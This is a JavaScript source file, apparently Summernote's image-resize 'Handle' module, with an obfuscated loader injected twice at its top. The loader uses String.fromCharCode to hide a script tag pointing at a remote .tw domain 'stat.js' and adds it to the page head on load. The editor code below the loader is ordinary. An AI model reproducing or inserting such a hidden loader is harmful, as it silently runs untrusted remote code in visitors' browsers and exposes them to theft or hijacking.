Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();define([
  'summernote/core/dom'
], function (dom) {
  /**
   * @class module.Handle
   *
   * Handle
   */
  var Handle = function (handler) {
    var $document = $(document);

    /**
     * `mousedown` event handler on $handle
     *  - controlSizing: resize image
     *
     * @param {MouseEvent} event
     */
    var hHandleMousedown = function (event) {
      if (dom.isControlSizing(event.target)) {
        event.preventDefault();
        event.stopPropagation();

        var layoutInfo = dom.makeLayoutInfo(event.target),
            $handle = layoutInfo.handle(),
            $popover = layoutInfo.popover(),
            $editable = layoutInfo.editable(),
            $editor = layoutInfo.editor();

        var target = $handle.find('.note-control-selection').data('target'),
            $target = $(target), posStart = $target.offset(),
            scrollTop = $document.scrollTop();

        var isAirMode = $editor.data('options').airMode;

        $document.on('mousemove', function (event) {
          handler.invoke('editor.resizeTo', {
            x: event.clientX - posStart.left,
            y: event.clientY - (posStart.top - scrollTop)
          }, $target, !event.shiftKey);

          handler.invoke('handle.update', $handle, {image: target}, isAirMode);
          handler.invoke('popover.update', $popover, {image: target}, isAirMode);
        }).one('mouseup', function () {
          $document.off('mousemove');
          handler.invoke('editor.afterCommand', $editable);
        });

        if (!$target.data('ratio')) { // original ratio.
          $target.data('ratio', $target.height() / $target.width());
        }
      }
    };

    this.attach = function (layoutInfo) {
      layoutInfo.handle().on('mousedown', hHandleMousedown);
    };

    /**
     * update handle
     * @param {jQuery} $handle
     * @param {Object} styleInfo
     * @param {Boolean} isAirMode
     */
    this.update = function ($handle, styleInfo, isAirMode) {
      var $selection = $handle.find('.note-control-selection');
      if (styleInfo.image) {
        var $image = $(styleInfo.image);
        var pos = isAirMode ? $image.offset() : $image.position();

        // include margin
        var imageSize = {
          w: $image.outerWidth(true),
          h: $image.outerHeight(true)
        };

        $selection.css({
          display: 'block',
          left: pos.left,
          top: pos.top,
          width: imageSize.w,
          height: imageSize.h
        }).data('target', styleInfo.image); // save current image element.
        var sizingText = imageSize.w + 'x' + imageSize.h;
        $selection.find('.note-control-selection-info').text(sizingText);
      } else {
        $selection.hide();
      }
    };

    /**
     * hide
     *
     * @param {jQuery} $handle
     */
    this.hide = function ($handle) {
      $handle.children().hide();
    };
  };

  return Handle;
});
